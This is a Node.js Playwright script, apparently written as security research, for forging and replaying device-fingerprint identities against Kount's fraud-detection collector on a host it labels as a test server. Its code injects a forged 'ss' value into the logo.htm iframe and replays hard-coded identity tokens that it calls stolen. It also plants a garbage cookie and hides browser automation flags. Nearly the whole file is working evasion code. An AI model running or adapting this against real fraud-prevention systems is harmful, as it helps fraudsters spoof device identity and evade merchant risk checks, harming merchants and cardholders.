#!/usr/bin/env node
/** knt-mint.mjs v2 — identity mint/spoof/reject on Kount's TEST collector.
 *  mint   : forge localStorage 'ss' (exactly 32 hex) in the logo.htm iframe -> ships + accepted?
 *  spoof  : present a STOLEN (ss + FPCV cookie) pair from another run -> replay accepted?
 *  reject : present a GARBAGE FPCV -> expect /collect/cookiestore 500 -> server reissues
 */
import { chromium } from 'playwright';
import http from 'node:http';
import { writeFileSync, mkdirSync } from 'node:fs';

const TST = { host: 'tst.kaptcha.com', ip: '44.240.88.212' };
const MERCHANT = '700000';
const MODE = process.argv[2] || 'mint';
const OUT = `/tmp/opencode/kount/mint-${MODE}`;
mkdirSync(OUT, { recursive: true });

const FORGED_SS = 'c0ffeec0ffeec0ffeec0ffeec0ffeec0';            // exactly 32 hex
const STOLEN_SS = 'e5e65927bd2c4b02bf5d215d3a888d20';            // real ss from earlier run
const STOLEN_FPCV = '85c84560a8a0e45289b1bbe6a6b8b432711fa9fc467014b34f30360344148a5d1adc3f68f1109ea7f0243970fa703054681eacabed54910b6317164f4b51a7286a11639f380c87fd1d5eae67e1b6e19a99d3d58bf606013ab662fff5c65fb8b8d50457bf848b1b4d58c37216f9ff6eb9757e889b1918126fb181f02b82300dd7343cc9ff938b4062b3df745b40723636e8e01ad3ea70fdc5158ae9';
const GARBAGE_FPCV = 'deadbeef' + '11'.repeat(150);               // invalid-length garbage

const srv = http.createServer((req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.end(`<!doctype html><html><body>
<script src="https://${TST.host}/collect/sdk?m=${MERCHANT}"></script>
<script>
  // spoof/reject: pre-load the (stolen|garbage) FPCV cookie before readCookie() runs
  if (${MODE === 'spoof' || MODE === 'reject'}) {
    document.cookie = 'cdn.bluesnap.${MERCHANT}.ka.ck=${MODE === 'spoof' ? STOLEN_FPCV : GARBAGE_FPCV};path=/;SameSite=None;Secure';
  }
  new ka.ClientSDK().collectData();
</script>
</body></html>`);
});
await new Promise(r => srv.listen(0, '127.0.0.1', r));
const port = srv.address().port;

const b = await chromium.launch({
  headless: true,
  args: [`--host-resolver-rules=MAP ${TST.host} ${TST.ip}, MAP ssl.kaptcha.com 35.80.101.90, MAP kaptcha.com 35.80.101.90`,
         '--disable-blink-features=AutomationControlled'],
});
const ctx = await b.newContext({ viewport: { width: 1280, height: 900 } });
const page = await ctx.newPage();

let injected = false;
await page.route('**/logo.htm*', async (route) => {
  const resp = await route.fetch();
  let html = await resp.text();
  if (!injected) {
    const ss = MODE === 'spoof' ? STOLEN_SS : FORGED_SS;
    html = html.replace("<script type='text/javascript'>", `<script type='text/javascript'>localStorage.setItem('ss','${ss}');`);
    injected = true;
  }
  await route.fulfill({ response: resp, body: html });
});

const shipped = [];
const respLog = [];
page.on('request', (req) => {
  const u = req.url();
  if (!u.includes('kaptcha.com')) return;
  const body = req.postData() || '';
  if (req.method() === 'POST' && (u.includes('/md') || u.includes('/fin'))) shipped.push({ u: u.slice(0, 100), body });
  if (u.includes('cookiestore')) shipped.push({ u: 'cookiestore', body: body.slice(0, 200) + '...' });
});
page.on('response', async (res) => {
  const u = res.url();
  if (u.includes('kaptcha.com')) respLog.push({ status: res.status(), url: u.slice(0, 100) });
});

await page.goto(`http://127.0.0.1:${port}/`, { waitUntil: 'domcontentloaded' });
await page.waitForTimeout(25000);
try { await page.evaluate(() => window.dispatchEvent(new Event('pagehide'))); } catch (_) {}
await page.waitForTimeout(3000);

let iframeState = null;
for (const f of page.frames()) {
  if (f.url().includes('logo.htm')) {
    iframeState = await f.evaluate(() => ({ ss: localStorage.getItem('ss') })).catch(() => null);
  }
}
const topState = await page.evaluate(() => ({
  fpcv: (document.cookie.match(/cdn\.[^=]+=([^;]+)/) || [])[1] || '(none)',
})).catch(() => null);

const out = { mode: MODE, forged_ss: FORGED_SS, shipped, respLog, iframeState, topState };
writeFileSync(`${OUT}/result.json`, JSON.stringify(out, null, 2));

console.log(`=== KOUNT ${MODE.toUpperCase()} (TEST collector, merchant ${MERCHANT}) ===`);
console.log('\nshipped:');
for (const s of shipped) {
  const n = (s.body.match(/n=(\w+)/) || [])[1];
  const ss = (s.body.match(/ss=([0-9a-f]{32})/) || [])[1];
  const k = (s.body.match(/k=([0-9a-f]{20,})/) || [])[1];
  console.log(`  ${s.u.split('/').pop().padEnd(16)} n=${n || '-'} ss=${ss || '-'} k=${k ? k.slice(0, 24) + '...' : '-'}`);
}
console.log('\nresponses:');
for (const r of respLog) console.log(`  ${r.status} ${r.url}`);
console.log('\niframe localStorage ss:', iframeState && iframeState.ss);
console.log('top-page FPCV cookie after:', topState ? topState.fpcv.slice(0, 40) + '...' : null);
srv.close(); await b.close();
